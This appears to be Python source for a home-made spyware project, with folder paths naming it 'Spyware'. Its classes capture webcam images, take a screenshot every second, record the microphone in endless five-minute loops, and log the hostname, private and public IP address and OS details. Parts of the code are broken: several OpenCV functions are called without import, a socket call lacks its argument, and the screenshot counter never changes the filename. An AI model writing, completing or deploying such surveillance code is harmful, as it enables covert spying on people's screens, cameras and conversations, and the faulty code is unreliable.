# Libraries
import datetime

import cv2
from PIL import ImageGrab
import sounddevice as sd
import wavfile as wf
import os
import time
import socket
from requests import get
import platform
from datetime import date, datetime

# Base class for widely used variables
class BaseClass:
    def __init__(self):
        # Date and time
        self.currentDate = date.today()
        self.currentTime = datetime.now()

        self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
        self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
        self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"

class WEBCAMERA(BaseClass):
    def __init__(self):
        super().__init__() # Call the base class __init__ method

    def webcamera(self):
        cap = VideoCapture(0)
        frame, image = cap.read()

        while frame:
            imshow('Webcam', image)
            imwrite('WebCamera.png', image)

            if cv2.waitKey(1) == ord('q'):
                break

        cap.release()
        cv2.destroyAllWindows()

class SCREENSHOTS(BaseClass):
    def __init__(self):
        super().__init__() # Call the base class __init__ method

        # Constants for variables
        self.counter = 0
        self.sleepAmount = 1

        # Folder path and filename
        self.folder_path = self.folder_path_screenshots
        self.output_file_name = f"Screenshot{self.counter}.png"

    def screenshots(self):
        while True:
            image = ImageGrab.grab()
            self.counter += 1

            if not os.path.exists(self.folder_path):
                os.makedirs(self.folder_path)

            # Save captured audio to the file path
            file_path = os.path.join(self.folder_path, self.output_file_name)
            image.save(file_path)

            time.sleep(1)

class MICROPHONE(BaseClass):
    def __init__(self):
        super().__init__() # Call the base class __init__ method

        # Constants for audio settings
        self.sample_rate = 44100 # Normal wave length for normal sound quality
        self.duration = 300 #Duration in seconds

        # Folder path and filename
        self.folder_path = self.folder_path_soundfiles
        self.output_file_name = f"Soundfile.wav"

    def microphone(self):
        while True:
            audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)

            if not os.path.exists(self.folder_path):
                os.makedirs(self.folder_path)

            sd.wait()

            print("Finished capturing audio.\n")

            # Save captured audio to the file path
            file_path = os.path.join(self.folder_path, self.output_file_name)
            wf.write(file_path, self.sample_rate, audio_data)

class SYS_INFO(BaseClass):
    def __init__(self):
        super().__init__() # Call the base class __init__ method

        # Folder path and filename
        self.folder_path = self.folder_path_sys_info
        self.output_file_name = "systeminfo.txt"

        # Public IP website link
        self.public_ip_link = "https://api.ipify.org"

    def system_information(self):
        with open(os.path.join(self.folder_path, self.output_file_name), "a") as f:
            hostname = socket.gethostbyname()
            IPAddr = socket.gethostbyname(hostname)

            try:
                public_ip = get(self.public_ip_link).text
                f.write(f"Public IP Address: {public_ip}\n")
            except Exception:
                f.write("Couldn't get Public IP Address (May be due to max query)\n")

            f.write(f"Processor Info: {platform.processor()}\n")
            f.write(f"System Info: {platform.system()}\n")
            f.write(f"Machine Info: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n\n\n")

            f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}")

    def os_version(self):
        platform_switch = {
            'Windows': lambda: print(f"Windows version: {platform.win32_ver()}\n"),
            'Darwin': lambda: print(f"Mac version: {platform.mac_ver()}\n"),
            'Linux': lambda: print(f"Linux version: {platform.libc_ver()}\nLinux version: {platform.freedesktop_os_release()}\n")
        }
        try:
            platform_name = platform.system()
            get_os = platform_switch.get(platform_name)

            if get_os:
                get_os()
            else:
                raise Exception("Unsupported platform")

        except Exception as e:
            print(f"An error occurred: {str(e)}")